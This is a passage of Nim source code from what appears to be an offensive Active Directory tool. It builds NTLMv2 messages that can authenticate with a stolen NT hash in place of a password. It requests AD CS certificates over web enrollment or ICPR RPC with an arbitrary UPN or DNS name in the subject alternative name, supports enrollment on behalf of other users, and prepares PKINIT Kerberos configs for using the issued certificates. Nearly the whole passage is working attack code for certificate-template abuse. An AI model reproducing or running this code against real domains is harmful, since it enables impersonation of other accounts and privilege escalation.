    if challengeBlob.len == 0:
      return (r1.status, r1.headers, body1, "server did not return NTLM challenge")
    let challenge = smbclient.parseNtlmChallenge(challengeBlob)
    if not challenge.offered:
      return (r1.status, r1.headers, body1, "could not parse NTLM challenge")
    let authDomain = if challenge.netbiosDomain.len > 0: challenge.netbiosDomain
                     elif domain.len > 0: domain
                     else: challenge.targetName
    let ntHash = smbclient.ntHashFromCredential(
      smbclient.SmbCredential(username: username, password: password, ntlmHash: ntlmHash, domain: authDomain))
    let clientChallenge = smbclient.randomBytes(8)
    proc avpairId(id: int; val: string): string = u16le(id) & u16le(val.len) & val
    var ti = challenge.targetInfo
    if ti.len >= 4 and ti[ti.len-4 ..< ti.len] == u16le(0) & u16le(0):
      ti.setLen(ti.len - 4)
    ti.add avpairId(9, smbclient.toUtf16Le("http/" & host))
    ti.add avpairId(6, u32le(2'u32))
    ti.add u16le(0) & u16le(0)
    let responses = smbclient.buildNtlmV2Responses(
      username, authDomain, ntHash,
      challenge.serverChallenge, ti, clientChallenge)
    let hasKeyExch = (challenge.flags and 0x40000000'u32) != 0
    var sessionKey: string
    var encryptedSessionKey: string
    if hasKeyExch:
      let rsk = smbclient.randomBytes(16)
      var rc4 = smbclient.rc4Init(responses.sessionBaseKey)
      encryptedSessionKey = smbclient.rc4Process(rc4, rsk)
      sessionKey = rsk
    else:
      sessionKey = responses.sessionBaseKey
      encryptedSessionKey = ""
    let domainUtf16 = smbclient.toUtf16Le(authDomain)
    let userUtf16   = smbclient.toUtf16Le(username)
    let micOffset = 72
    let payloadOff = 88
    proc secbuf(len, off: int): string = u16le(len) & u16le(len) & u32le(uint32(off))
    var off = payloadOff
    let lmSec  = secbuf(responses.lm.len, off); off += responses.lm.len
    let ntSec  = secbuf(responses.nt.len, off); off += responses.nt.len
    let domSec = secbuf(domainUtf16.len, off);  off += domainUtf16.len
    let usrSec = secbuf(userUtf16.len, off);    off += userUtf16.len
    let wsSec  = secbuf(0, off)
    let mkSec  = secbuf(encryptedSessionKey.len, off)
    let type3Flags = challenge.flags or 0x00000030'u32
    var type3 = "NTLMSSP\x00" & u32le(3'u32)
    type3.add lmSec & ntSec & domSec & usrSec & wsSec & mkSec & u32le(type3Flags)
    type3.add "\x0A\x00\x21\x4A\x00\x00\x00\x0F"
    type3.add newString(16)
    type3.add responses.lm & responses.nt & domainUtf16 & userUtf16 & encryptedSessionKey
    let mic = smbclient.hmacMd5(sessionKey, type1 & challengeBlob & type3)
    for i in 0 ..< 16:
      type3[micOffset + i] = mic[i]
    await adcsHttpSendAsync(sock, httpMethod, host, path,
      authScheme & " " & base64.encode(type3), body, contentType, keepAlive = false)
    let raw3 = await adcsRecvHeaders(sock, timeoutMs)
    let r3 = adcsParseResponse(raw3)
    let body3 = await adcsRecvBody(sock, r3.headers, r3.body, timeoutMs)
    if r3.status notin [200, 201]:
      return (r3.status, r3.headers, body3, "HTTP " & $r3.status)
    return (r3.status, r3.headers, body3, "request completed")
  except CatchableError as error:
    result.message = error.msg.splitLines()[0]
  finally:
    sock.close()

proc findAdcsRequestId(body: string): string =
  for marker in ["ReqID=", "ReqID%3d", "RequestId="]:
    let pos = body.find(marker)
    if pos >= 0:
      var i = pos + marker.len
      while i < body.len and body[i] in {'0'..'9'}:
        result.add body[i]
        inc i
      if result.len > 0: return

proc pemWrap(label, raw: string): string
proc fetchAdcsCaDer(host: string; port: int; timeoutMs: int;
                    username, password, domain, ntlmHash, caName: string;
                    kerberos: bool): Future[string] {.async.}
proc generateAdcsCsr(config: CliConfig): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string]

type
  EvpPkey {.importc: "EVP_PKEY", header: "<openssl/evp.h>".} = object
  X509Obj {.importc: "X509", header: "<openssl/x509.h>".} = object
  X509NameObj {.importc: "X509_NAME", header: "<openssl/x509.h>".} = object
  X509ExtObj {.importc: "X509_EXTENSION", header: "<openssl/x509.h>".} = object
  X509v3Ctx {.importc: "X509V3_CTX", header: "<openssl/x509v3.h>".} = object
  Asn1Integer {.importc: "ASN1_INTEGER", header: "<openssl/asn1.h>".} = object
  Asn1Time {.importc: "ASN1_TIME", header: "<openssl/asn1.h>".} = object
  EvpMd {.importc: "EVP_MD", header: "<openssl/evp.h>".} = object
  BioObj {.importc: "BIO", header: "<openssl/bio.h>".} = object
  BioMethod {.importc: "BIO_METHOD", header: "<openssl/bio.h>".} = object
  X509ReqObj {.importc: "X509_REQ", header: "<openssl/x509.h>".} = object
  Pkcs7Obj {.importc: "PKCS7", header: "<openssl/pkcs7.h>".} = object

proc EVP_RSA_gen(bits: cuint): ptr EvpPkey {.importc, header: "<openssl/rsa.h>".}
proc EVP_PKEY_free(key: ptr EvpPkey) {.importc, header: "<openssl/evp.h>".}
proc X509_new(): ptr X509Obj {.importc, header: "<openssl/x509.h>".}
proc X509_free(a: ptr X509Obj) {.importc, header: "<openssl/x509.h>".}
proc X509_set_version(x: ptr X509Obj; version: clong): cint {.importc, header: "<openssl/x509.h>".}
proc X509_get_serialNumber(x: ptr X509Obj): ptr Asn1Integer {.importc, header: "<openssl/x509.h>".}
proc ASN1_INTEGER_set(a: ptr Asn1Integer; v: clong): cint {.importc, header: "<openssl/asn1.h>".}
proc X509_gmtime_adj(s: ptr Asn1Time; adj: clong): ptr Asn1Time {.importc, header: "<openssl/x509.h>".}
proc X509_get_notBefore(x: ptr X509Obj): ptr Asn1Time {.importc, header: "<openssl/x509.h>".}
proc X509_get_notAfter(x: ptr X509Obj): ptr Asn1Time {.importc, header: "<openssl/x509.h>".}
proc X509_set_pubkey(x: ptr X509Obj; pkey: ptr EvpPkey): cint {.importc, header: "<openssl/x509.h>".}
proc X509_get_subject_name(a: ptr X509Obj): ptr X509NameObj {.importc, header: "<openssl/x509.h>".}
proc X509_NAME_add_entry_by_txt(name: ptr X509NameObj; field: cstring; typ: cint;
                                 bytes: pointer; len, loc, sety: cint): cint {.importc, header: "<openssl/x509.h>".}
proc X509_set_issuer_name(x: ptr X509Obj; name: ptr X509NameObj): cint {.importc, header: "<openssl/x509.h>".}
proc X509_sign(x: ptr X509Obj; pkey: ptr EvpPkey; md: ptr EvpMd): cint {.importc, header: "<openssl/x509.h>".}
proc EVP_sha256(): ptr EvpMd {.importc, header: "<openssl/evp.h>".}
proc X509V3_set_ctx(ctx: ptr X509v3Ctx; issuer, subject: ptr X509Obj;
                    req, crl: pointer; flags: cint) {.importc, header: "<openssl/x509v3.h>".}
proc X509V3_set_ctx_nodb(ctx: ptr X509v3Ctx) {.importc, header: "<openssl/x509v3.h>".}
proc X509V3_EXT_conf_nid(conf: pointer; ctx: ptr X509v3Ctx; ext_nid: cint;
                          value: cstring): ptr X509ExtObj {.importc, header: "<openssl/x509v3.h>".}
proc X509_add_ext(x: ptr X509Obj; ex: ptr X509ExtObj; loc: cint): cint {.importc, header: "<openssl/x509.h>".}
proc X509_EXTENSION_free(a: ptr X509ExtObj) {.importc, header: "<openssl/x509.h>".}
proc BIO_new(typ: ptr BioMethod): ptr BioObj {.importc, header: "<openssl/bio.h>".}
proc BIO_s_mem(): ptr BioMethod {.importc, header: "<openssl/bio.h>".}
proc BIO_free(a: ptr BioObj): cint {.importc, header: "<openssl/bio.h>".}
proc BIO_read(b: ptr BioObj; data: pointer; dlen: cint): cint {.importc, header: "<openssl/bio.h>".}
proc BIO_ctrl(b: ptr BioObj; cmd: cint; larg: clong; parg: pointer): clong {.importc, header: "<openssl/bio.h>".}
proc PEM_write_bio_X509(bp: ptr BioObj; x: ptr X509Obj): cint {.importc, header: "<openssl/pem.h>".}
proc PEM_write_bio_PrivateKey(bp: ptr BioObj; key: ptr EvpPkey; enc: pointer;
                               kstr: pointer; klen: cint;
                               cb: pointer; u: pointer): cint {.importc, header: "<openssl/pem.h>".}
proc X509_REQ_new(): ptr X509ReqObj {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_free(a: ptr X509ReqObj) {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_set_version(x: ptr X509ReqObj; v: clong): cint {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_get_subject_name(a: ptr X509ReqObj): ptr X509NameObj {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_set_pubkey(x: ptr X509ReqObj; pkey: ptr EvpPkey): cint {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_sign(x: ptr X509ReqObj; pkey: ptr EvpPkey; md: ptr EvpMd): cint {.importc, header: "<openssl/x509.h>".}
proc PEM_write_bio_X509_REQ(bp: ptr BioObj; x: ptr X509ReqObj): cint {.importc, header: "<openssl/pem.h>".}
proc i2d_X509_REQ(a: ptr X509ReqObj; pp: ptr ptr byte): cint {.importc, header: "<openssl/x509.h>".}
proc X509_REQ_add_extensions(req: ptr X509ReqObj; exts: pointer): cint {.importc, header: "<openssl/x509.h>".}
proc OPENSSL_sk_new_null(): pointer {.importc, header: "<openssl/safestack.h>".}
proc OPENSSL_sk_push(st: pointer; data: pointer): cint {.importc, header: "<openssl/safestack.h>".}
proc OPENSSL_sk_free(st: pointer) {.importc, header: "<openssl/safestack.h>".}
proc OPENSSL_free(p: pointer) {.importc, header: "<openssl/crypto.h>".}
proc PKCS7_sign(signcert: ptr X509Obj; pkey: ptr EvpPkey; certs: pointer;
                data: ptr BioObj; flags: cint): ptr Pkcs7Obj {.importc, header: "<openssl/pkcs7.h>".}
proc PKCS7_free(p7: ptr Pkcs7Obj) {.importc, header: "<openssl/pkcs7.h>".}
proc i2d_PKCS7(a: ptr Pkcs7Obj; pp: ptr ptr byte): cint {.importc, header: "<openssl/pkcs7.h>".}
proc BIO_new_mem_buf(buf: pointer; len: cint): ptr BioObj {.importc, header: "<openssl/bio.h>".}
proc BIO_new_file(filename: cstring; mode: cstring): ptr BioObj {.importc, header: "<openssl/bio.h>".}
proc PEM_read_bio_X509(bp: ptr BioObj; x: ptr ptr X509Obj; cb: pointer; u: pointer): ptr X509Obj {.importc, header: "<openssl/pem.h>".}
proc PEM_read_bio_PrivateKey(bp: ptr BioObj; x: ptr ptr EvpPkey; cb: pointer; u: pointer): ptr EvpPkey {.importc, header: "<openssl/pem.h>".}
proc bioToString(bio: ptr BioObj): string =
  var p: pointer
  let n = BIO_ctrl(bio, 3, 0, addr p)
  if n > 0:
    result = newString(n)
    copyMem(addr result[0], p, n)

const NID_ext_key_usage = 126
const NID_subject_alt_name = 85
const NID_key_usage = 83
const NID_basic_constraints = 87

const
  ICertPassageUuid = [
    byte 0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11,
         0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0, 0x91, 0xbe
  ]
  CrDispIssued = 0x00000003'u32
  CrDispUnderSubmission = 0x00000005'u32

proc adcsAddU32Le(data: var string; value: uint32) =
  data.add char(int(value and 0xff))
  data.add char(int((value shr 8) and 0xff))
  data.add char(int((value shr 16) and 0xff))
  data.add char(int((value shr 24) and 0xff))

proc adcsReadU32Le(data: string; offset: int): uint32 =
  if offset + 3 >= data.len:
    return 0
  uint32(ord(data[offset])) or
    (uint32(ord(data[offset + 1])) shl 8) or
    (uint32(ord(data[offset + 2])) shl 16) or
    (uint32(ord(data[offset + 3])) shl 24)

proc adcsPad4(data: var string) =
  while data.len mod 4 != 0:
    data.add char(0)

proc adcsDecodeUtf16Le(raw: string): string =
  var i = 0
  while i + 1 < raw.len:
    let code = int(uint16(ord(raw[i])) or (uint16(ord(raw[i + 1])) shl 8))
    if code == 0:
      break
    if code >= 32 and code <= 126:
      result.add chr(code)
    elif code == 10 or code == 13 or code == 9:
      result.add chr(code)
    else:
      result.add '?'
    inc i, 2

proc adcsBuildUniqueWString(text: string; referent: uint32; includeNull = true): string =
  if text.len == 0:
    result.add "\x00\x00\x00\x00"
    return
  let utf = smbclient.toUtf16Le(text) & (if includeNull: "\x00\x00" else: "")
  let chars = uint32(utf.len div 2)
  result.adcsAddU32Le referent
  result.adcsAddU32Le chars
  result.adcsAddU32Le 0
  result.adcsAddU32Le chars
  result.add utf
  result.adcsPad4()

proc adcsBuildCertTransBlob(data: string; referent: uint32): string =
  result.adcsAddU32Le uint32(data.len)
  if data.len == 0:
    result.adcsAddU32Le 0'u32
    return
  result.adcsAddU32Le referent
  result.adcsAddU32Le uint32(data.len)
  result.add data
  result.adcsPad4()


proc wrapCsrPkcs7(csrDer, certFile, keyFile: string): string =
  let certBio = BIO_new_file(certFile.cstring, "r")
  if certBio == nil: return ""
  defer: discard BIO_free(certBio)
  let eaCert = PEM_read_bio_X509(certBio, nil, nil, nil)
  if eaCert == nil: return ""
  defer: X509_free(eaCert)
  let keyBio = BIO_new_file(keyFile.cstring, "r")
  if keyBio == nil: return ""
  defer: discard BIO_free(keyBio)
  let eaKey = PEM_read_bio_PrivateKey(keyBio, nil, nil, nil)
  if eaKey == nil: return ""
  defer: EVP_PKEY_free(eaKey)
  let dataBio = BIO_new_mem_buf(unsafeAddr csrDer[0], cint(csrDer.len))
  if dataBio == nil: return ""
  defer: discard BIO_free(dataBio)
  let p7 = PKCS7_sign(eaCert, eaKey, nil, dataBio, 0x80.cint)
  if p7 == nil: return ""
  defer: PKCS7_free(p7)
  var derBuf: ptr byte = nil
  let derLen = i2d_PKCS7(p7, addr derBuf)
  if derLen > 0 and derBuf != nil:
    result = newString(derLen)
    copyMem(addr result[0], derBuf, derLen)
    OPENSSL_free(derBuf)

proc adcsBuildIcprStub(authority, attributes, requestDer: string; dwFlags: uint32 = 0'u32): string =
  result.adcsAddU32Le dwFlags
  result.add adcsBuildUniqueWString(authority, 0x00020000'u32)
  result.adcsAddU32Le 0'u32
  let attrsUtf = if attributes.len > 0: smbclient.toUtf16Le(attributes) & "\x00\x00" else: ""
  result.add adcsBuildCertTransBlob(attrsUtf, 0x00020004'u32)
  result.add adcsBuildCertTransBlob(requestDer, 0x00020008'u32)

proc adcsParseCertTransBlob(stub: string; offset: var int): string =
  if offset + 8 > stub.len:
    return ""
  let cb = int(adcsReadU32Le(stub, offset))
  let blobPtr = adcsReadU32Le(stub, offset + 4)
  offset += 8
  if cb <= 0 or blobPtr == 0:
    return ""
  if offset + 4 > stub.len:
    return ""
  let maxCount = int(adcsReadU32Le(stub, offset))
  offset += 4
  let take = min(cb, maxCount)
  if take < 0 or offset + take > stub.len:
    return ""
  result = stub[offset ..< offset + take]
  offset += take
  while offset mod 4 != 0 and offset < stub.len:
    inc offset

proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.ldapAdcsCa.len == 0 or config.ldapAdcsTemplate.len == 0:
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false,
      "message": "--adcs-request requires --ca and --template"}
  let csr = generateAdcsCsr(config)
  if not csr.ok:
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false, "message": "CSR generation failed",
      "output": csr.output}
  var requestDer = csr.csrDer
  var icprFlags = 0'u32
  var attrib = "CertificateTemplate:" & config.ldapAdcsTemplate
  if config.ldapAdcsUpn.len > 0:
    attrib.add "\nSAN:upn=" & config.ldapAdcsUpn
  if config.ldapAdcsDns.len > 0:
    attrib.add "\nSAN:dns=" & config.ldapAdcsDns
  if config.ldapAdcsOnBehalfOf.len > 0:
    let obo = config.ldapAdcsOnBehalfOf
    let requester =
      if "\\" in obo or "@" in obo: obo
      elif config.domain.len > 0: config.domain & "\\" & obo
      else: obo
    attrib.add "\nRequesterName:" & requester
    if config.ldapCertFile.len > 0 and config.ldapAdcsKey.len > 0:
      let p7der = wrapCsrPkcs7(requestDer, config.ldapCertFile, config.ldapAdcsKey)
      if p7der.len > 0:
        requestDer = p7der
        icprFlags = 0x302'u32
  let credential = smbclient.SmbCredential(
    username: config.username, password: config.password,
    ntlmHash: config.ntlmHash, domain: config.domain,
    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
  let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
  let session = await smbclient.establishSmbSession(host, 445, max(config.timeoutMs, 8000),
    credential, authMethod)
  if session == nil or not session.authenticated:
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false,
      "message": if session == nil: "no SMB session" else: session.message}
  let pipe = await session.ctx.openSmbPipe("cert")
  if not pipe.opened:
    asyncnet.close(session.ctx.socket)
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false,
      "message": "could not open \\\\PIPE\\\\cert", "status": "0x" & pipe.status.toHex(8)}
  var bindOk = false
  var callRes: smbclient.DceRpcCallResult
  if config.kerberos:
    let bound = await session.ctx.rpcBindPipeKerb(pipe, @ICertPassageUuid, 0'u16, 0'u16,
      host, config.domain)
    bindOk = bound.info.bound
    if bindOk:
      callRes = await session.ctx.rpcCallExKerbSealed(pipe, bound.sealCtx, 0'u16,
        adcsBuildIcprStub(config.ldapAdcsCa, attrib, requestDer, icprFlags), 2'u32)
  else:
    let bound = await session.ctx.rpcBindPipeNtlm(pipe, @ICertPassageUuid, 0'u16, 0'u16,
      credential)
    bindOk = bound.info.bound
    if bindOk:
      callRes = await session.ctx.rpcCallExSealed(pipe, bound.sealCtx, 0'u16,
        adcsBuildIcprStub(config.ldapAdcsCa, attrib, requestDer, icprFlags), 2'u32)
  if not bindOk:
    asyncnet.close(session.ctx.socket)
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false, "message": "ICPR bind failed"}
  asyncnet.close(session.ctx.socket)
  if callRes.packetType == 3'u8:
    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
      "host": host, "success": false, "fault_status": "0x" & callRes.faultStatus.toHex(8),
      "message": "ICPR request faulted"}
  var off = 0
  let requestId = adcsReadU32Le(callRes.stub, off); off += 4
  let disposition = adcsReadU32Le(callRes.stub, off); off += 4
  let certChain = adcsParseCertTransBlob(callRes.stub, off)
  let encodedCert = adcsParseCertTransBlob(callRes.stub, off)
  let dispositionMessage = adcsParseCertTransBlob(callRes.stub, off)
  let returnCode =
    if off + 4 <= callRes.stub.len: adcsReadU32Le(callRes.stub, off)
    else: 0xffffffff'u32
  var certPath = ""
  var caPemPath = ""
  if encodedCert.len > 0:
    certPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".cer"
    writeFile(certPath, pemWrap("CERTIFICATE", encodedCert))
    let caDer = await fetchAdcsCaDer(host, if config.port > 0: config.port else: 389,
      max(config.timeoutMs, 5000), config.username, config.password,
      config.domain, config.ntlmHash, config.ldapAdcsCa, config.kerberos)
    if caDer.len > 0:
      caPemPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".ca.pem"
      writeFile(caPemPath, pemWrap("CERTIFICATE", caDer))
  let dispText = adcsDecodeUtf16Le(dispositionMessage)
  return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
    "host": host, "success": returnCode == 0'u32 and disposition == CrDispIssued and encodedCert.len > 0,
    "return_code": "0x" & returnCode.toHex(8), "request_id": requestId,
    "disposition": "0x" & disposition.toHex(8), "ca": config.ldapAdcsCa,
    "template": config.ldapAdcsTemplate, "on_behalf_of": config.ldapAdcsOnBehalfOf,
    "key": csr.keyPath, "csr": csr.csrPath,
    "cert": certPath, "ca_pem": caPemPath,
    "cert_chain_len": certChain.len, "cert_len": encodedCert.len,
    "message": if dispText.len > 0: dispText
      elif disposition == CrDispIssued: "certificate issued"
      elif disposition == CrDispUnderSubmission: "request is pending"
      else: "ICPR request completed"}

proc generateAdcsCsr(config: CliConfig): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string] =
  let prefix =
    if config.ldapAdcsOut.len > 0: config.ldapAdcsOut
    else: getTempDir() / ("nimux-adcs-" & $getCurrentProcessId())
  result.keyPath = prefix & ".key"
  result.csrPath = prefix & ".csr"
  let cn =
    if config.ldapAdcsUpn.len > 0: config.ldapAdcsUpn
    elif config.ldapAdcsDns.len > 0: config.ldapAdcsDns
    elif config.username.len > 0: config.username
    else: "nimux"
  result.subject = "/CN=" & cn
  let pkey = EVP_RSA_gen(2048)
  if pkey == nil:
    result.output = "RSA key generation failed"
    return
  defer: EVP_PKEY_free(pkey)
  let req = X509_REQ_new()
  if req == nil:
    result.output = "X509_REQ_new failed"
    return
  defer: X509_REQ_free(req)
  discard X509_REQ_set_version(req, 0)
  let subjectName = X509_REQ_get_subject_name(req)
  let cnBytes = cn.cstring
  discard X509_NAME_add_entry_by_txt(subjectName, "CN", 0x1000,
    cast[pointer](cnBytes), cn.len.cint, -1, 0)
  discard X509_REQ_set_pubkey(req, pkey)
  let sanValue =
    if config.ldapAdcsUpn.len > 0:
      "otherName:1.3.6.1.4.1.311.20.2.3;UTF8:" & config.ldapAdcsUpn
    elif config.ldapAdcsDns.len > 0:
      "DNS:" & config.ldapAdcsDns
    else: ""
  if sanValue.len > 0:
    let ext = X509V3_EXT_conf_nid(nil, nil, NID_subject_alt_name, sanValue.cstring)
    if ext != nil:
      let stack = OPENSSL_sk_new_null()
      discard OPENSSL_sk_push(stack, ext)
      discard X509_REQ_add_extensions(req, stack)
      OPENSSL_sk_free(stack)
      X509_EXTENSION_free(ext)
  discard X509_REQ_sign(req, pkey, EVP_sha256())
  var derBuf: ptr byte = nil
  let derLen = i2d_X509_REQ(req, addr derBuf)
  if derLen > 0 and derBuf != nil:
    result.csrDer = newString(derLen)
    copyMem(addr result.csrDer[0], derBuf, derLen)
    OPENSSL_free(derBuf)
  let csrBio = BIO_new(BIO_s_mem())
  defer: discard BIO_free(csrBio)
  discard PEM_write_bio_X509_REQ(csrBio, req)
  let csrPem = bioToString(csrBio)
  let keyBio = BIO_new(BIO_s_mem())
  defer: discard BIO_free(keyBio)
  discard PEM_write_bio_PrivateKey(keyBio, pkey, nil, nil, 0, nil, nil)
  let keyPem = bioToString(keyBio)
  writeFile(result.keyPath, keyPem)
  writeFile(result.csrPath, csrPem)
  result.ok = result.csrDer.len > 0

proc ldapAdcsRequestJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.ldapAdcsRpc:
    return await ldapAdcsRpcRequestJson(host, config)
  if config.ldapAdcsCa.len == 0 or config.ldapAdcsTemplate.len == 0:
    return %*{"protocol": "ldap", "operation": "adcs-request",
      "host": host, "success": false,
      "message": "--adcs-request requires --ca and --template"}
  let csr = generateAdcsCsr(config)
  if not csr.ok:
    return %*{"protocol": "ldap", "operation": "adcs-request", "host": host,
      "success": false, "message": "CSR generation failed",
      "output": csr.output}
  let csrText = readFile(csr.csrPath)
  var attrib = "CertificateTemplate:" & config.ldapAdcsTemplate
  if config.ldapAdcsUpn.len > 0:
    attrib.add "\nSAN:upn=" & config.ldapAdcsUpn
  if config.ldapAdcsDns.len > 0:
    attrib.add "\nSAN:dns=" & config.ldapAdcsDns
  if config.ldapAdcsOnBehalfOf.len > 0:
    let obo = config.ldapAdcsOnBehalfOf
    let requester =
      if "\\" in obo or "@" in obo: obo
      elif config.domain.len > 0: config.domain & "\\" & obo
      else: obo
    attrib.add "\nRequesterName:" & requester
  let form = "Mode=newreq" &
    "&CertRequest=" & encodeUrl(csrText) &
    "&CertAttrib=" & encodeUrl(attrib) &
    "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
  let ssl = config.useSsl
  let port =
    if config.port > 0 and config.port != 389 and config.port != 636: config.port
    elif ssl: 443
    else: 80
  let resp = await adcsHttpNtlmRequest(host, port, max(config.timeoutMs, 8000),
    config.username, config.password, config.ntlmHash, config.domain,
    "POST", "/certsrv/certfnsh.asp", form, "application/x-www-form-urlencoded", ssl)
  let reqId = findAdcsRequestId(resp.body)
  var certPath = ""
  var certStatus = 0
  var certBody = ""
  var caPemPath = ""
  if reqId.len > 0:
    let certResp = await adcsHttpNtlmRequest(host, port, max(config.timeoutMs, 8000),
      config.username, config.password, config.ntlmHash, config.domain,
      "GET", "/certsrv/certnew.cer?ReqID=" & reqId & "&Enc=b64",
      "", "application/octet-stream", ssl)
    certStatus = certResp.status
    certBody = certResp.body
    if certResp.status == 200 and certResp.body.len > 0:
      certPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".cer"
      writeFile(certPath, certResp.body)
      let caDer = await fetchAdcsCaDer(host, if config.port > 0: config.port else: 389,
        max(config.timeoutMs, 5000), config.username, config.password,
        config.domain, config.ntlmHash, config.ldapAdcsCa, config.kerberos)
      if caDer.len > 0:
        caPemPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".ca.pem"
        writeFile(caPemPath, pemWrap("CERTIFICATE", caDer))
  return %*{"protocol": "ldap", "operation": "adcs-request", "host": host,
    "success": resp.status in [200, 201] and reqId.len > 0,
    "http_status": resp.status, "request_id": reqId, "ca": config.ldapAdcsCa,
    "template": config.ldapAdcsTemplate, "on_behalf_of": config.ldapAdcsOnBehalfOf,
    "key": csr.keyPath, "csr": csr.csrPath,
    "cert": certPath, "ca_pem": caPemPath, "cert_http_status": certStatus,
    "response_preview": resp.body[0 ..< min(resp.body.len, 500)],
    "cert_preview": certBody[0 ..< min(certBody.len, 200)],
    "message": if reqId.len > 0: "ADCS request submitted" else: resp.message}

proc pemWrap(label, raw: string): string =
  result = "-----BEGIN " & label & "-----\n"
  let b64 = encode(raw)
  var i = 0
  while i < b64.len:
    let chunkLen = min(64, b64.len - i)
    result.add b64[i ..< i + chunkLen]
    result.add '\n'
    inc i, chunkLen
  result.add "-----END " & label & "-----\n"

proc buildPkinitKrb5Config(realm, domain, kdcHost, caPemPath: string;
                           extraAnchors: seq[string] = @[]): string =
  result = "[libdefaults]\n"
  result.add "  default_realm = " & realm & "\n"
  result.add "  dns_lookup_kdc = false\n"
  result.add "  dns_lookup_realm = false\n"
  result.add "  rdns = false\n\n"
  result.add "[realms]\n"
  result.add "  " & realm & " = {\n"
  result.add "    kdc = " & kdcHost & "\n"
  result.add "    admin_server = " & kdcHost & "\n"
  if caPemPath.len > 0:
    result.add "    pkinit_anchors = FILE:" & caPemPath & "\n"
  for anchor in extraAnchors:
    result.add "    pkinit_anchors = FILE:" & anchor & "\n"
  if caPemPath.len > 0 or extraAnchors.len > 0:
    result.add "    pkinit_kdc_hostname = " & kdcHost & "\n"
  result.add "  }\n\n"
  if domain.len > 0:
    result.add "[domain_realm]\n"
    result.add "  ." & domain.toLowerAscii() & " = " & realm & "\n"
    result.add "  " & domain.toLowerAscii() & " = " & realm & "\n"

proc adcsArtifactPrefix(config: CliConfig): string =
  if config.ldapAdcsOut.len > 0:
    return config.ldapAdcsOut
  for path in [config.ldapCertFile, config.ldapAdcsPfx]:
    if path.len == 0:
      continue
    for ext in [".cer", ".crt", ".pem", ".pfx", ".p12"]:
      if path.toLowerAscii().endsWith(ext):
        return path[0 ..< path.len - ext.len]
    return path
  ""

proc fetchAdcsCaDer(host: string; port: int; timeoutMs: int;
                    username, password, domain, ntlmHash, caName: string;
                    kerberos: bool): Future[string] {.async.} =
  let caFilter =
    if caName.len > 0:
      "(&(objectClass=certificationAuthority)(cn=" & caName & "))"
    else:
      "(&(objectClass=certificationAuthority)(cACertificate=*))"
  let caProbe = await ldapclient.probeLdap(host, port, timeoutMs,
    username, password, domain, ntlmHash,
    ldapclient.LdapQueryOptions(
      rootDse: true,
      config: true,
      customFilter: caFilter,
      customAttrs: @["cn", "cACertificate"],
      limit: 10
    ),
    kerberos=kerberos)
  for entry in caProbe.config:
    if "cACertificate" in entry.attrs and entry.attrs["cACertificate"].len > 0:
      return entry.attrs["cACertificate"][0]

proc preparePkinitConfig(host, principal: string; config: CliConfig;
                         extraAnchors: seq[string] = @[]): Future[(string, string)] {.async.} =
  let port = if config.port > 0: config.port else: 389
  let probe = await ldapclient.probeLdap(host, port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true), kerberos=config.kerberos)
  let realm =
    if principal.contains("@"): principal.split("@", 1)[1].toUpperAscii()
    elif config.domain.len > 0: config.domain.toUpperAscii()
    else: ""
  let baseDomain =
    if probe.defaultNamingContext.len > 0: baseDnToDnsName(probe.defaultNamingContext)
    elif config.domain.contains("."): config.domain.toLowerAscii()
    else: ""
  let kdcHost =
    if probe.dnsHostName.len > 0: probe.dnsHostName
    else: host
  let artifactPrefix = adcsArtifactPrefix(config)
  var caPemPath = ""
  if config.krb5CaPath.len > 0 and fileExists(config.krb5CaPath):
    caPemPath = config.krb5CaPath
  if caPemPath.len == 0 and artifactPrefix.len > 0:
    let sidecar = artifactPrefix & ".ca.pem"
    if fileExists(sidecar):
      caPemPath = sidecar
  if caPemPath.len == 0:
    let caDer = await fetchAdcsCaDer(host, port, max(config.timeoutMs, 5000),
      config.username, config.password, config.domain, config.ntlmHash,
      config.ldapAdcsCa, config.kerberos)
    if caDer.len == 0 and (config.ldapAdcsCa.len > 0 or extraAnchors.len == 0):
      raise newException(ValueError, "could not fetch ADCS CA certificate from LDAP")
    if caDer.len > 0:
      let prefix =
        if artifactPrefix.len > 0: artifactPrefix
        else: getTempDir() / ("nimux-pkinit-" & $getCurrentProcessId())
      caPemPath = prefix & ".ca.pem"
      writeFile(caPemPath, pemWrap("CERTIFICATE", caDer))
  let prefix = getTempDir() / ("nimux-pkinit-" & $getCurrentProcessId())
  let krb5Path = prefix & ".conf"
  writeFile(krb5Path, buildPkinitKrb5Config(realm, baseDomain, kdcHost, caPemPath, extraAnchors))
  result = (krb5Path, caPemPath)

proc ldapAdcsAuthJson(host: string; config: CliConfig): JsonNode =
  var principal =
    if config.ldapAdcsUpn.len > 0: config.ldapAdcsUpn
    elif config.username.len > 0 and config.domain.len > 0: config.username & "@" & config.domain.toUpperAscii()
    else: ""
